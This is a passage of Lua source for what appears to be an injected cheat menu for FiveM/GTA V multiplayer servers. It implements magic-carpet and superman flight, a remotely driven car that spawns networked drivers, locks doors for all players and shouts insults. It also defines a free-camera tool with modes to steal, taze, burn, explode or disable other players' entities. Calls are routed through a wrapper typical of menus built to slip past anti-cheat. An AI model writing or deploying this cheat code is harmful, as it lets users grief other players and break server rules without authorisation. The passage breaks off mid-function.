           local _keys = {}
       
           function ADRVSDD:DoKeyPressed()
               if not ADRVSDD.Config.ShowControlsOnScreen then return end
               local offY = 0
               local count = 0
       
               for name, control in dict.pairs(ADRVSDD.Keys) do
                   if ADRVSDD:GetFunction("IsControlJustPressed")(0, control) or ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, control) then
                       table.insert(_keys, {
                           str = name .. "[" .. control .. "]",
                           expires = ADRVSDD:GetFunction("GetGameTimer")() + 5000
                       })
                   end
       
                   count = count + 1
               end
       
               for _, key in dict.pairs(_keys) do
                   local cur = ADRVSDD:GetFunction("GetGameTimer")()
                   local left = key.expires - cur
       
                   if left <= 0 then
                       table.remove(_keys, _)
                   else
                       local secs = (left / 1000)
                       local alpha = dict.math.ceil(((left / 1000) / 5) * 255) + 50
                       alpha = _clamp(alpha, 0, 255)
                       offY = offY + 0.024 * _clamp(secs * 4, 0, 1)
                       ADRVSDD:ScreenText(key.str, 4, 0.0, 0.8, 1 - offY, 0.3, 255, 255, 255, alpha)
                   end
               end
           end
       
           local function _do_riding()
               if not magic_riding then
                   ADRVSDD:GetFunction("ClearPedTasks")(ADRVSDD:GetFunction("PlayerPedId")())
                   local rot = ADRVSDD:GetFunction("GetEntityRotation")(magic_carpet_obj)
                   ADRVSDD:GetFunction("SetEntityRotation")(magic_carpet_obj, 0.0, rot.y, rot.z)
               else
                   local coords = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ADRVSDD:GetFunction("PlayerPedId")(), 0.0, 0.0, 0.0)
                   local carpet = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(magic_carpet_obj, 0.0, 0.0, 0.0)
                   local head = ADRVSDD:GetFunction("GetEntityHeading")(magic_carpet_obj)
                   ADRVSDD:GetFunction("SetEntityHeading")(ADRVSDD:GetFunction("PlayerPedId")(), head)
                   ADRVSDD:GetFunction("SetEntityCoords")(ADRVSDD:GetFunction("PlayerPedId")(), carpet.x, carpet.y, carpet.z)
                   ADRVSDD:GetFunction("TaskPlayAnim")(ADRVSDD:GetFunction("PlayerPedId")(), "rcmcollect_paperleadinout@", "meditiate_idle", 2.0, 2.5, -1, 47, 0, 0, 0, 0)
               end
           end
       
           local function _right_vec()
               local right = vector3(0, 1, 0)
       
               return right
           end
       
           local function _up_vec()
               local up = vector3(0, 0, 1)
       
               return up
           end
       
           local function _do_flying()
               if not magic_riding then return end
               ADRVSDD.FreeCam:DisableMovement(true)
       
               if not IsEntityPlayingAnim(ADRVSDD:GetFunction("PlayerPedId")(), "rcmcollect_paperleadinout@", "meditiate_idle", 3) then
                   ADRVSDD:GetFunction("TaskPlayAnim")(ADRVSDD:GetFunction("PlayerPedId")(), "rcmcollect_paperleadinout@", "meditiate_idle", 2.0, 2.5, -1, 47, 0, 0, 0, 0)
               end
       
               local carpet = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(magic_carpet_obj, 0.0, 0.0, 0.0)
               local rot = ADRVSDD:GetFunction("GetGameplayCamRot")(0)
       
               if not ADRVSDD.FreeCam.On then
                   ADRVSDD:GetFunction("SetEntityRotation")(magic_carpet_obj, rot.x + 0.0, rot.y + 0.0, rot.z + 0.0)
                   local forwardVec = ADRVSDD:GetFunction("GetEntityForwardVector")(magic_carpet_obj)
                   local rightVec = _right_vec(magic_carpet_obj)
                   local upVec = _up_vec(magic_carpet_obj)
                   local speed = 1.0
       
                   if ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["LEFTCTRL"]) then
                       speed = 0.1
                   elseif ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["LEFTSHIFT"]) then
                       speed = 1.8
                   end
       
                   if ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["W"]) then
                       carpet = carpet + forwardVec * speed
                   end
       
                   if ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["S"]) then
                       carpet = carpet - forwardVec * speed
                   end
       
                   if ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["SPACE"]) then
                       carpet = carpet + upVec * speed
                   end
       
                   if ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["X"]) then
                       carpet = carpet - upVec * speed
                   end
       
                   ADRVSDD:GetFunction("SetEntityCoords")(magic_carpet_obj, carpet.x, carpet.y, carpet.z)
               end
       
               ADRVSDD:GetFunction("SetEntityRotation")(ADRVSDD:GetFunction("PlayerPedId")(), rot.x, rot.y, rot.z)
               ADRVSDD:GetFunction("AttachEntityToEntity")(ADRVSDD:GetFunction("PlayerPedId")(), magic_carpet_obj, 0, 0.0, 0.0, 1.0, rot.x, ADRVSDD:GetFunction("GetEntityHeading")(magic_carpet_obj), rot.z, false, false, false, false, 1, false)
           end
       
           local _no_combat
           local _was_no_combat
       
           CreateThread(function()
               while ADRVSDD.Enabled do
                   Wait(0)
       
                   if _no_combat and not _was_no_combat then
                       _was_no_combat = true
                   elseif not _no_combat and _was_no_combat then
                       _was_no_combat = false
                       ADRVSDD.FreeCam:DisableCombat(_no_combat)
                   end
       
                   if _no_combat then
                       ADRVSDD.FreeCam:DisableCombat(_no_combat)
                   end
               end
           end)
       
           CreateThread(function()
               ADRVSDD:RequestModelSync("apa_mp_h_acc_rugwoolm_03")
               ADRVSDD:GetFunction("RequestAnimDict")("rcmcollect_paperleadinout@")
       
               while ADRVSDD.Enabled do
                   Wait(0)
       
                   if ADRVSDD.Config.Player.MagicCarpet then
                       local our_cam = ADRVSDD:GetFunction("GetRenderingCam")()
       
                       if not magic_carpet_obj or not ADRVSDD:GetFunction("DoesEntityExist")(magic_carpet_obj) then
                           local cur = ADRVSDD:GetFunction("GetGameplayCamCoord")()
                           local _dir = ADRVSDD:GetFunction("GetGameplayCamRot")(0)
                           local dir = rot_to_dir(_dir)
                           local dist = 100.0
                           local len = _multiply(dir, dist)
                           local targ = cur + len
                           local handle = ADRVSDD:GetFunction("StartShapeTestRay")(cur.x, cur.y, cur.z, targ.x, targ.y, targ.z, 1, preview_magic_carpet)
                           local _, hit, hit_pos, _, entity = ADRVSDD:GetFunction("GetShapeTestResult")(handle)
       
                           if not preview_magic_carpet or not ADRVSDD:GetFunction("DoesEntityExist")(preview_magic_carpet) then
                               _no_combat = true
                               preview_magic_carpet = ADRVSDD:GetFunction("CreateObject")(ADRVSDD:GetFunction("GetHashKey")("apa_mp_h_acc_rugwoolm_03"), hit_pos.x, hit_pos.y, hit_pos.z + 0.5, false, true, true)
                               ADRVSDD:GetFunction("SetEntityCollision")(preview_magic_carpet, false, false)
                               ADRVSDD:GetFunction("SetEntityAlpha")(preview_magic_carpet, 100)
                               Wait(50)
                           elseif hit then
                               ADRVSDD:GetFunction("SetEntityCoords")(preview_magic_carpet, hit_pos.x, hit_pos.y, hit_pos.z + 0.5)
                               ADRVSDD:GetFunction("SetEntityAlpha")(preview_magic_carpet, 100)
                               ADRVSDD:GetFunction("FreezeEntityPosition")(preview_magic_carpet, true)
                               ADRVSDD:GetFunction("SetEntityRotation")(preview_magic_carpet, 0.0, 0.0, _dir.z + 0.0)
                               ADRVSDD:GetFunction("SetEntityCollision")(preview_magic_carpet, false, false)
                           end
       
                           if ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["MOUSE1"]) and not ADRVSDD.Showing then
                               magic_carpet_obj = ADRVSDD:GetFunction("CreateObject")(ADRVSDD:GetFunction("GetHashKey")("apa_mp_h_acc_rugwoolm_03"), hit_pos.x, hit_pos.y, hit_pos.z + 0.5, true, true, true)
                               ADRVSDD:DoNetwork(magic_carpet_obj)
                               local rot = ADRVSDD:GetFunction("GetEntityRotation")(preview_magic_carpet)
                               ADRVSDD:GetFunction("SetEntityRotation")(magic_carpet_obj, rot)
                               ADRVSDD.Util:DeleteEntity(preview_magic_carpet)
                               _no_combat = false
                           end
                       else
                           ADRVSDD:GetFunction("FreezeEntityPosition")(magic_carpet_obj, true)
                           _do_flying()
                           local coords = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ADRVSDD:GetFunction("PlayerPedId")(), 0.0, 0.0, 0.0)
                           local carpet = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(magic_carpet_obj, vector_origin)
                           local dist = ADRVSDD:GetFunction("GetDistanceBetweenCoords")(coords.x, coords.y, coords.z, carpet.x, carpet.y, carpet.z)
       
                           if dist <= 5.0 then
                               ADRVSDD:Draw3DText(carpet.x, carpet.y, carpet.z, "Press [E] to get " .. (magic_riding and "off" or "on") .. ".", ADRVSDD.Tertiary[1], ADRVSDD.Tertiary[2], ADRVSDD.Tertiary[3])
       
                               if ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys["E"]) then
                                   magic_riding = not magic_riding
                                   _do_riding()
                               end
                           end
                       end
                   else
                       _no_combat = false
       
                       if preview_magic_carpet and ADRVSDD:GetFunction("DoesEntityExist")(preview_magic_carpet) then
                           ADRVSDD.Util:DeleteEntity(preview_magic_carpet)
                       end
       
                       if magic_carpet_obj and ADRVSDD:GetFunction("DoesEntityExist")(magic_carpet_obj) then
                           ADRVSDD.Util:DeleteEntity(magic_carpet_obj)
                           ADRVSDD:GetFunction("ClearPedTasks")(ADRVSDD:GetFunction("PlayerPedId")())
                       end
                   end
               end
           end)
       
           CreateThread(function()
               while ADRVSDD.Enabled do
                   if ADRVSDD.Config.Player.SuperMan then
                       ADRVSDD:GetFunction("GivePlayerRagdollControl")(PlayerId(), true)
                       ADRVSDD:GetFunction("SetPedCanRagdoll")(ADRVSDD:GetFunction("PlayerPedId")(), false)
                       ADRVSDD:GetFunction("GiveDelayedWeaponToPed")(ADRVSDD:GetFunction("PlayerPedId")(), 0xFBAB5776, 1, 0)
                       local up, forward = ADRVSDD:GetFunction("IsControlPressed")(0, ADRVSDD.Keys["SPACE"]), ADRVSDD:GetFunction("IsControlPressed")(0, ADRVSDD.Keys["W"])
       
                       if up or forward then
                           if up then
                               ADRVSDD:GetFunction("ApplyForceToEntity")(ADRVSDD:GetFunction("PlayerPedId")(), 1, 0.0, 0.0, 9999999.0, 0.0, 0.0, 0.0, true, true, true, true, false, true)
                           elseif ADRVSDD:GetFunction("IsEntityInAir")(ADRVSDD:GetFunction("PlayerPedId")()) then
                               ADRVSDD:GetFunction("ApplyForceToEntity")(ADRVSDD:GetFunction("PlayerPedId")(), 1, 0.0, 9999999.0, 0.0, 0.0, 0.0, 0.0, true, true, true, true, false, true)
                           end
       
                           Wait(0)
                       end
                   else
                       ADRVSDD:GetFunction("GivePlayerRagdollControl")(PlayerId(), false)
                       ADRVSDD:GetFunction("SetPedCanRagdoll")(ADRVSDD:GetFunction("PlayerPedId")(), true)
                   end
       
                   Wait(0)
               end
           end)
       
           ADRVSDD.RCCar = {
               Cam = nil,
               On = false,
               Driver = nil,
               Vehicle = nil,
               CamOn = false,
               Keys = {
                   NUMPAD_UP = 111,
                   NUMPAD_DOWN = 112,
                   NUMPAD_LEFT = 108,
                   NUMPAD_RIGHT = 109,
                   UP = 188,
                   DOWN = 173,
                   LEFT = 174,
                   RIGHT = 175
               }
           }
       
           local _rc_on
       
           function ADRVSDD.RCCar:MoveCar()
               ADRVSDD:GetFunction("TaskSetBlockingOfNonTemporaryEvents")(self.Driver, true)
               ADRVSDD:GetFunction("NetworkRequestControlOfEntity")(self.Vehicle)
               ADRVSDD:GetFunction("SetVehicleEngineOn")(self.Vehicle, true)
               ADRVSDD:GetFunction("SetPedAlertness")(self.Driver, 0.0)
       
               if (ADRVSDD:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_UP) or ADRVSDD:GetFunction("IsControlPressed")(0, self.Keys.UP)) and (not ADRVSDD:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_DOWN) and not ADRVSDD:GetFunction("IsControlPressed")(0, self.Keys.DOWN)) then
                   ADRVSDD:GetFunction("TaskVehicleTempAction")(self.Driver, self.Vehicle, 9, 1)
               end
       
               if (ADRVSDD:GetFunction("IsControlReleased")(0, self.Keys.NUMPAD_UP) and ADRVSDD:GetFunction("IsControlReleased")(0, self.Keys.UP)) or (ADRVSDD:GetFunction("IsControlJustReleased")(0, self.Keys.NUMPAD_DOWN) or ADRVSDD:GetFunction("IsControlJustReleased")(0, self.Keys.DOWN)) then
                   ADRVSDD:GetFunction("TaskVehicleTempAction")(self.Driver, self.Vehicle, 6, 2500)
               end
       
               if (ADRVSDD:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_DOWN) or ADRVSDD:GetFunction("IsControlPressed")(0, self.Keys.DOWN)) and (not ADRVSDD:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_UP) and not ADRVSDD:GetFunction("IsControlPressed")(0, self.Keys.UP)) then
                   ADRVSDD:GetFunction("TaskVehicleTempAction")(self.Driver, self.Vehicle, 22, 1)
               end
       
               if (ADRVSDD:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_LEFT) or ADRVSDD:GetFunction("IsControlPressed")(0, self.Keys.LEFT)) and (ADRVSDD:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_DOWN) or ADRVSDD:GetFunction("IsControlPressed")(0, self.Keys.DOWN)) then
                   ADRVSDD:GetFunction("TaskVehicleTempAction")(self.Driver, self.Vehicle, 13, 1)
               end
       
               if (ADRVSDD:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_RIGHT) or ADRVSDD:GetFunction("IsControlPressed")(0, self.Keys.RIGHT)) and (ADRVSDD:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_DOWN) or ADRVSDD:GetFunction("IsControlPressed")(0, self.Keys.DOWN)) then
                   ADRVSDD:GetFunction("TaskVehicleTempAction")(self.Driver, self.Vehicle, 14, 1)
               end
       
               if (ADRVSDD:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_UP) or ADRVSDD:GetFunction("IsControlPressed")(0, self.Keys.UP)) and (ADRVSDD:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_DOWN) or ADRVSDD:GetFunction("IsControlPressed")(0, self.Keys.DOWN)) then
                   ADRVSDD:GetFunction("TaskVehicleTempAction")(self.Driver, self.Vehicle, 30, 100)
               end
       
               if (ADRVSDD:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_LEFT) or ADRVSDD:GetFunction("IsControlPressed")(0, self.Keys.LEFT)) and (ADRVSDD:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_UP) or ADRVSDD:GetFunction("IsControlPressed")(0, self.Keys.UP)) then
                   ADRVSDD:GetFunction("TaskVehicleTempAction")(self.Driver, self.Vehicle, 7, 1)
               end
       
               if (ADRVSDD:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_RIGHT) or ADRVSDD:GetFunction("IsControlPressed")(0, self.Keys.RIGHT)) and (ADRVSDD:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_UP) or ADRVSDD:GetFunction("IsControlPressed")(0, self.Keys.UP)) then
                   ADRVSDD:GetFunction("TaskVehicleTempAction")(self.Driver, self.Vehicle, 8, 1)
               end
       
               if (ADRVSDD:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_LEFT) or ADRVSDD:GetFunction("IsControlPressed")(0, self.Keys.LEFT)) and (not ADRVSDD:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_UP) and not ADRVSDD:GetFunction("IsControlPressed")(0, self.Keys.UP)) and (not ADRVSDD:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_DOWN) and not ADRVSDD:GetFunction("IsControlPressed")(0, self.Keys.DOWN)) then
                   ADRVSDD:GetFunction("TaskVehicleTempAction")(self.Driver, self.Vehicle, 4, 1)
               end
       
               if (ADRVSDD:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_RIGHT) or ADRVSDD:GetFunction("IsControlPressed")(0, self.Keys.RIGHT)) and (not ADRVSDD:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_UP) and not ADRVSDD:GetFunction("IsControlPressed")(0, self.Keys.UP)) and (not ADRVSDD:GetFunction("IsControlPressed")(0, self.Keys.NUMPAD_DOWN) and not ADRVSDD:GetFunction("IsControlPressed")(0, self.Keys.DOWN)) then
                   ADRVSDD:GetFunction("TaskVehicleTempAction")(self.Driver, self.Vehicle, 5, 1)
               end
           end
       
           local rc_camRP, rc_camRY, rc_camRR
           local p, y, r
       
           local function approach(from, to, inc)
               if from >= to then return from end
       
               return from + inc
           end
       
           function ADRVSDD.RCCar:GetCamRot(gameplay_rot)
               local car_rot = ADRVSDD:GetFunction("GetEntityRotation")(self.Vehicle)
       
               if not p and not y and not r then
                   p, y, r = car_rot.x, car_rot.y, car_rot.z
               end
       
               p = approach(p, car_rot.x, 0.5)
               y = approach(y, car_rot.y, 0.5)
               r = approach(r, car_rot.z, 0.5)
       
               return car_rot.x, car_rot.y, car_rot.z
           end
       
           local insults, voices = {"GENERIC_INSULT_HIGH", "GENERIC_INSULT_MED", "GENERIC_SHOCKED_HIGH", "FIGHT_RUN", "CRASH_CAR", "KIFFLOM_GREET", "PHONE_SURPRISE_EXPLOSION"}, {"S_M_Y_SHERIFF_01_WHITE_FULL_01", "A_F_M_SOUCENT_02_BLACK_FULL_01", "A_F_M_BODYBUILD_01_WHITE_FULL_01", "A_F_M_BEVHILLS_02_BLACK_FULL_01"}
       
           function ADRVSDD.RCCar:Tick()
               if not ADRVSDD:GetFunction("DoesCamExist")(self.Cam) then
                   self.Cam = ADRVSDD:GetFunction("CreateCam")("DEFAULT_SCRIPTED_CAMERA", true)
               end
       
               while ADRVSDD.Enabled do
                   Wait(0)
       
                   if self.On then
                       local rot_vec = ADRVSDD:GetFunction("GetGameplayCamRot")(0)
       
                       if not ADRVSDD:GetFunction("DoesEntityExist")(self.Vehicle) then
                           ADRVSDD:GetFunction("ClearPedTasksImmediately")(self.Driver)
                           ADRVSDD.Util:DeleteEntity(self.Driver)
                           self.CamOn = false
                           self.On = false
                       elseif not ADRVSDD:GetFunction("DoesEntityExist")(self.Driver) or ADRVSDD:GetFunction("GetPedInVehicleSeat")(self.Vehicle, -1) ~= self.Driver or ADRVSDD:GetFunction("IsEntityDead")(self.Driver) then
                           ADRVSDD:GetFunction("ClearPedTasksImmediately")(ADRVSDD:GetFunction("GetPedInVehicleSeat")(self.Vehicle, -1))
                           local model = ADRVSDD.FreeCam.SpawnerOptions.PED[dict.math.random(1, #ADRVSDD.FreeCam.SpawnerOptions.PED)]
                           ADRVSDD:RequestModelSync(model)
                           ADRVSDD.Util:DeleteEntity(self.Driver)
                           self.Driver = ADRVSDD:GetFunction("CreatePedInsideVehicle")(self.Vehicle, 24, ADRVSDD:GetFunction("GetHashKey")(model), -1, true, true)
                       end
       
                       if self.On then
                           self:MoveCar()
                           ADRVSDD:GetFunction("SetVehicleDoorsLockedForAllPlayers")(self.Vehicle, true)
                           ADRVSDD:GetFunction("SetVehicleDoorsLocked")(self.Vehicle, 2)
       
                           if ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys["E"]) then
                               ADRVSDD:GetFunction("PlayAmbientSpeechWithVoice")(self.Driver, insults[dict.math.random(1, #insults)], voices[dict.math.random(1, #voices)], "SPEECH_PARAMS_FORCE_SHOUTED", false)
                           end
                       end
       
                       if self.CamOn and not _rc_on then
                           ADRVSDD:GetFunction("SetCamActive")(self.Cam, true)
                           ADRVSDD:GetFunction("RenderScriptCams")(true, false, false, true, true)
                           _rc_on = true
                           local coords = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(self.Vehicle, 0.0, 0.0, 0.0) + (ADRVSDD:GetFunction("GetEntityForwardVector")(self.Vehicle) * (ADRVSDD:GetModelLength(self.Vehicle) * -0.85))
                           rc_camX, rc_camY, rc_camZ = coords.x, coords.y, coords.z
                           local rot = ADRVSDD:GetFunction("GetEntityRotation")(self.Vehicle)
                           rc_camRP, rc_camRY, rc_camRR = rot.x, rot.y, rot.z
                           ADRVSDD:GetFunction("ClearPedTasks")(ADRVSDD:GetFunction("PlayerPedId")())
                           walking = false
                       elseif not self.CamOn and _rc_on then
                           ADRVSDD:GetFunction("FreezeEntityPosition")(ADRVSDD:GetFunction("PlayerPedId")(), false)
                           ADRVSDD:GetFunction("SetCamActive")(self.Cam, false)
                           ADRVSDD:GetFunction("RenderScriptCams")(false, false, false, false, false)
                           ADRVSDD:GetFunction("SetFocusEntity")(ADRVSDD:GetFunction("PlayerPedId")())
                           ADRVSDD.FreeCam:DisableMovement(false)
                           _rc_on = false
                       end
       
                       if self.CamOn and _rc_on then
                           local ent_pos = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(self.Vehicle, 0.0, 0.0, 0.0) + (ADRVSDD:GetFunction("GetEntityForwardVector")(self.Vehicle) * (ADRVSDD:GetModelLength(self.Vehicle) * -0.85))
       
                           if not ADRVSDD:GetFunction("IsPedInAnyVehicle")(ADRVSDD:GetFunction("PlayerPedId")()) and not ADRVSDD.Config.UseAutoWalkAlt then
                               ADRVSDD:GetFunction("FreezeEntityPosition")(ADRVSDD:GetFunction("PlayerPedId")(), true)
                           elseif ADRVSDD.Config.UseAutoWalkAlt then
                               ADRVSDD:GetFunction("FreezeEntityPosition")(ADRVSDD:GetFunction("PlayerPedId")(), false)
                           end
       
                           ADRVSDD:DrawIbuttons()
                           ADRVSDD.FreeCam:DisableMovement(true)
                           ADRVSDD:GetFunction("SetFocusPosAndVel")(rc_camX, rc_camY, rc_camZ, 0, 0, 0)
                           ADRVSDD:GetFunction("SetCamCoord")(self.Cam, rc_camX, rc_camY, rc_camZ)
                           ADRVSDD:GetFunction("SetCamRot")(self.Cam, rc_camRP + 0.0, rc_camRY + 0.0, rc_camRR + 0.0)
                           rc_camX, rc_camY, rc_camZ = ent_pos.x, ent_pos.y, ent_pos.z
                           rc_camRP, rc_camRY, rc_camRR = self:GetCamRot(rot_vec)
                           rc_camZ = rc_camZ + (ADRVSDD:GetModelHeight(self.Vehicle) * 1.2)
                       end
                   end
               end
           end
       
           ADRVSDD.FreeCam = {
               Cam = nil,
               On = false,
               Modifying = nil,
               Mode = 1, -- ADRVSDD.FreeCam.Modes["LOOK_AROUND"],
               Modes = {
                   ["LOOK_AROUND"] = 1,
                   ["REMOVER"] = 2,
                   ["PED_SPAWNER"] = 3,
                   ["OBJ_SPAWNER"] = 4,
                   ["VEH_SPAWNER"] = 5,
                   ["PREMADE_SPAWNER"] = 6,
                   ["TELEPORT"] = 7,
                   ["RC_CAR"] = 8,
                   ["STEAL"] = 9,
                   ["TAZE"] = 10,
                   ["HYDRANT"] = 11,
                   ["FIRE"] = 12,
                   ["SPIKE_STRIPS"] = 13,
                   ["DISABLE_VEHICLE"] = 14,
                   ["EXPLODE"] = 15
               },
               ModeNames = {
                   [1] = "Look Around",
                   [2] = "Remover",
                   [3] = "Ped Spawner",
                   [4] = "Object Spawner",
                   [5] = "Vehicle Spawner",
                   [6] = "Premade Spawner",
                   [7] = "Teleport",
                   [8] = "RC Car",
                   [9] = "Steal",
                   [10] = "Taze Entity",
                   [11] = "Hydrant Entity",
                   [12] = "Fire Entity",
                   [13] = "Place Spike Strips",
                   [14] = "Disable Vehicle",
                   [15] = "Explode Entity"
               }
           }
       
           function ADRVSDD.FreeCam:Switcher()
               if not self.On then return end
               local cur = self.Mode
               local new = cur
               if self.DraggingEntity and ADRVSDD:GetFunction("DoesEntityExist")(self.DraggingEntity) then return end
       
               if ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys["["]) then
                   new = cur - 1
       
                   if not self.ModeNames[new] then
                       new = #self.ModeNames
                   end
       
                   self.Mode = new
               end
       
               if ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys["]"]) then
                   new = cur + 1
       
                   if not self.ModeNames[new] then
                       new = 1
                   end
       
                   self.Mode = new
               end
           end
       
           function ADRVSDD.FreeCam:Toggle(mode)
               self.On = not self.On
               self.Mode = mode
           end
       
           function ADRVSDD.FreeCam:GetModelSize(hash)
               return ADRVSDD:GetFunction("GetModelDimensions")(hash)
           end
       
           function ADRVSDD.FreeCam:DrawBoundingBox(entity, r, g, b, a)
               if entity then
                   r = r or 255
                   g = g or 0
                   b = b or 0
                   a = a or 40
                   local model = ADRVSDD:GetFunction("GetEntityModel")(entity)
                   local min, max = ADRVSDD:GetFunction("GetModelDimensions")(model)
                   local top_front_right = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, max)
                   local top_back_right = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, vector3(max.x, min.y, max.z))
                   local bottom_front_right = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, vector3(max.x, max.y, min.z))
                   local bottom_back_right = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, vector3(max.x, min.y, min.z))
                   local top_front_left = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, vector3(min.x, max.y, max.z))
                   local top_back_left = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, vector3(min.x, min.y, max.z))
                   local bottom_front_left = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, vector3(min.x, max.y, min.z))
                   local bottom_back_left = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, min)
                   -- LINES
                   -- RIGHT SIDE
                   ADRVSDD:GetFunction("DrawLine")(top_front_right, top_back_right, r, g, b, a)
                   ADRVSDD:GetFunction("DrawLine")(top_front_right, bottom_front_right, r, g, b, a)
                   ADRVSDD:GetFunction("DrawLine")(bottom_front_right, bottom_back_right, r, g, b, a)
                   ADRVSDD:GetFunction("DrawLine")(top_back_right, bottom_back_right, r, g, b, a)
                   -- LEFT SIDE
                   ADRVSDD:GetFunction("DrawLine")(top_front_left, top_back_left, r, g, b, a)
                   ADRVSDD:GetFunction("DrawLine")(top_back_left, bottom_back_left, r, g, b, a)
                   ADRVSDD:GetFunction("DrawLine")(top_front_left, bottom_front_left, r, g, b, a)
                   ADRVSDD:GetFunction("DrawLine")(bottom_front_left, bottom_back_left, r, g, b, a)
                   -- Connection
                   ADRVSDD:GetFunction("DrawLine")(top_front_right, top_front_left, r, g, b, a)
                   ADRVSDD:GetFunction("DrawLine")(top_back_right, top_back_left, r, g, b, a)
                   ADRVSDD:GetFunction("DrawLine")(bottom_front_left, bottom_front_right, r, g, b, a)
                   ADRVSDD:GetFunction("DrawLine")(bottom_back_left, bottom_back_right, r, g, b, a)
                   -- POLYGONS
                   -- FRONT
                   ADRVSDD:GetFunction("DrawPoly")(top_front_left, top_front_right, bottom_front_right, r, g, b, a)
                   ADRVSDD:GetFunction("DrawPoly")(bottom_front_right, bottom_front_left, top_front_left, r, g, b, a)
                   -- TOP
                   ADRVSDD:GetFunction("DrawPoly")(top_front_right, top_front_left, top_back_right, r, g, b, a)
                   ADRVSDD:GetFunction("DrawPoly")(top_front_left, top_back_left, top_back_right, r, g, b, a)
                   -- BACK
                   ADRVSDD:GetFunction("DrawPoly")(top_back_right, top_back_left, bottom_back_right, r, g, b, a)
                   ADRVSDD:GetFunction("DrawPoly")(top_back_left, bottom_back_left, bottom_back_right, r, g, b, a)
                   -- LEFT
                   ADRVSDD:GetFunction("DrawPoly")(top_back_left, top_front_left, bottom_front_left, r, g, b, a)
                   ADRVSDD:GetFunction("DrawPoly")(bottom_front_left, bottom_back_left, top_back_left, r, g, b, a)
                   -- RIGHT
                   ADRVSDD:GetFunction("DrawPoly")(top_front_right, top_back_right, bottom_front_right, r, g, b, a)
                   ADRVSDD:GetFunction("DrawPoly")(top_back_right, bottom_back_right, bottom_front_right, r, g, b, a)
                   -- BOTTOM
                   ADRVSDD:GetFunction("DrawPoly")(bottom_front_left, bottom_front_right, bottom_back_right, r, g, b, a)
                   ADRVSDD:GetFunction("DrawPoly")(bottom_back_right, bottom_back_left, bottom_front_left, r, g, b, a)
       
                   return true
               end
       
               return false
           end
       
           function ADRVSDD.FreeCam:Crosshair(on)
               if on then
                   ADRVSDD:GetFunction("DrawRect")(0.5, 0.5, 0.008333333, 0.001851852, ADRVSDD.Tertiary[1], ADRVSDD.Tertiary[2], ADRVSDD.Tertiary[3], 255)
                   ADRVSDD:GetFunction("DrawRect")(0.5, 0.5, 0.001041666, 0.014814814, ADRVSDD.Tertiary[1], ADRVSDD.Tertiary[2], ADRVSDD.Tertiary[3], 255)
               else
                   ADRVSDD:GetFunction("DrawRect")(0.5, 0.5, 0.008333333, 0.001851852, 100, 100, 100, 255)
                   ADRVSDD:GetFunction("DrawRect")(0.5, 0.5, 0.001041666, 0.014814814, 100, 100, 100, 255)
               end
           end
       
           function ADRVSDD:Draw3DText(x, y, z, text, r, g, b)
               ADRVSDD:GetFunction("SetDrawOrigin")(x, y, z, 0)
               ADRVSDD:GetFunction("SetTextFont")(0)
               ADRVSDD:GetFunction("SetTextProportional")(0)
               ADRVSDD:GetFunction("SetTextScale")(0.0, 0.20)
               ADRVSDD:GetFunction("SetTextColour")(r, g, b, 255)
               ADRVSDD:GetFunction("SetTextOutline")()
               ADRVSDD:GetFunction("BeginTextCommandDisplayText")("STRING")
               ADRVSDD:GetFunction("SetTextCentre")(1)
               ADRVSDD:GetFunction("AddTextComponentSubstringPlayerName")(text)
               ADRVSDD:GetFunction("EndTextCommandDisplayText")(0.0, 0.0)
               ADRVSDD:GetFunction("ClearDrawOrigin")()
           end
       
           function ADRVSDD:DrawScaled3DText(x, y, z, textInput, fontId, scaleX, scaleY)
               local coord = ADRVSDD:GetFunction("GetFinalRenderedCamCoord")()
               local px, py, pz = coord.x, coord.y, coord.z
